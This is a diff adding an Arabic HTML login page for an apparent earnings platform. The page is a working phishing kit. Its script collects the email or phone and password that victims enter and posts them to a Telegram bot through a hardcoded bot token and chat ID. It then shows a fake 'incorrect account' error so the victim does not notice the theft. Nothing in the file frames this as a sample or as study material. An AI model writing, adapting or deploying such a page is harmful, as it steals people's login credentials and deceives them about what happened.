@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل بيانات</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>تسجيل منصة سنتات للأرباح</h2>
+        <form id="registrationForm">
+            <label for="phone">البريد الإلكتروني أو رقم الهاتف:</label>
+            <input type="text" id="phone" name="phone" required>
+
+            <label for="password">كلمة السر:</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="button" id="registerButton">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('registerButton').addEventListener('click', function() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // التحقق من الحقول الفارغة
+            if (!phone || !password) {
+                alert('يرجى إدخال البريد الإلكتروني أو رقم الهاتف وكلمة السر!');
+                return;
+            }
+
+            // التحقق من طول كلمة السر
+            if (password.length < 8) {
+                alert('كلمة السر يجب أن تكون على الأقل 8 أحرف!');
+                return;
+            }
+
+            const botToken = "7879341938:AAHoNv-NjarCUcrSpIY_lpTGGpdYy0goDQ4"; // ضع هنا رمز البوت الخاص بك
+            const chatId = "6317422525"; // ضع هنا معرف الشات (القناة أو المستخدم)
+            const message = `📲 الحساب : ${phone}\n🔑 كلمة السر: ${password}`;
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('معلومات الحساب غير صحيحة!');
+                } else {
+                    alert('حدث خطأ أثناء تسجيل البيانات.');
+                }
+            })
+            .catch(error => {
+                alert('خطأ في الاتصال بـ Telegram API.');
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
